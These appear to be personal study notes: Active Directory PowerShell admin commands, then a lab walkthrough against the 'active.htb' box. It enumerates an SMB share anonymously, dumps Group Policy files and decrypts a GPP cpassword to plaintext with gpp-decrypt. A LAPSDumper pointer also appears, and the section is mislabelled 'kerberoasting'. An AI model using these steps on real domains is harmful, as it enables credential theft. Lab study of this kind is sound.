```powershell
Basic Commands Needed  
xfreerdp /v:<IP> /u:<User> /p:<Password>  
ping <IP>  
  
General Commands  
Get-Module  
Returns a list of loaded PowerShell Modules.  
  
Get-Command -Module ActiveDirectory  
Lists commands for the module specified.  
  
Get-Help <cmd-let>  
Shows help syntax for the cmd-let specified.  
  
Import-Module ActiveDirectory Imports the Active Directory Module  
  
Active Directory PowerShell Commands  
AD User Commands  
New-ADUser -Name "first last" -Accountpassword (Read-Host -AsSecureString "Super$ecurePassword!") -Enabled $true -OtherAttributes @{'title'="Analyst";'mail'="f.last@domain.com"}  
Add a user to AD and set attributes.  
  
Remove-ADUser -Identity <name>  
Removes a user from AD with the identity of 'name'.  
  
Unlock-ADAccount -Identity <name>  
Unlocks a user account with the identity of 'name'.  
  
Set-ADAccountPassword -Identity <'name'> -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "NewP@ssw0rdReset!" -Force)  
Set the password of an AD user to the password specified.  
  
Set-ADUser -Identity amasters -ChangePasswordAtLogon $true  
Force a user to change their password at next logon attempt.  
  
AD Group Commands  
New-ADOrganizationalUnit -Name "name" -Path "OU=folder,DC=domain,DC=local"  
Create a new AD OU container named "name" in the path specified.  
  
New-ADGroup -Name "name" -SamAccountName analysts -GroupCategory Security -GroupScope Global -DisplayName "Security Analysts" -Path "CN=Users,DC=domain,DC=local" -Description "Members of this group are Security Analysts under the IT OU"  
Create a new security group named "name" with the accompanying attributes.  
  
Add-ADGroupMember -Identity 'group name' -Members 'ACepheus,OStarchaser,ACallisto'  
Add an AD user to the group specified.  
  
GPO Commands  
Copy-GPO -SourceName "GPO to copy" -TargetName "Name"  
Copy a GPO for use as a new GPO with a target name of "name".  
  
Set-GPLink -Name "Security Analysts Control" -Target "ou=Security Analysts,ou=IT,OU=HQ-NYC,OU=Employees,OU=Corp,dc=INLANEFREIGHT,dc=LOCAL" -LinkEnabled Yes  
Link a GPO for use to a specific OU or security group.  
  
Computer Commands  
Add-Computer -DomainName 'INLANEFREIGHT.LOCAL' -Credential 'INLANEFREIGHT\HTB-student_adm' -Restart  
Add a new computer to the domain using the credentials specified.  
  
Add-Computer -ComputerName 'name' -LocalCredential '.\localuser' -DomainName 'INLANEFREIGHT.LOCAL' -Credential 'INLANEFREIGHT\htb-student_adm' -Restart  
Remotely add a computer to a domain.  
  
Get-ADComputer -Identity "name" -Properties * | select CN,CanonicalName,IPv4Address  
Check for a computer named "name" and view its properties.

Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *
Shows passwords or like this if configured LAPS&LDAP or if not have cmd access use LAPSDumper.py from github
----------------------------------------------------------------------------------------------------------------------------------------------------------
#kerberoasting
└─$ smbclient  \\\\10.10.10.100\\Replication
Password for [WORKGROUP\sysrq]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> prompt off
smb: \> recursive on
recursive: command not found
smb: \> recurse on
smb: \> mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0,1 KiloBytes/sec) (average 0,1 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0,1 KiloBytes/sec) (average 0,1 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0,4 KiloBytes/sec) (average 0,2 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (8,7 KiloBytes/sec) (average 2,4 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (1,7 KiloBytes/sec) (average 2,2 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (3,7 KiloBytes/sec) (average 2,5 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (11,6 KiloBytes/sec) (average 3,8 KiloBytes/sec)
smb: \> ^C

┌──(sysrq㉿vargan)-[~/active]
└─$ cat groups.xml
┌──(sysrq㉿vargan)-[~/active]
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18


```
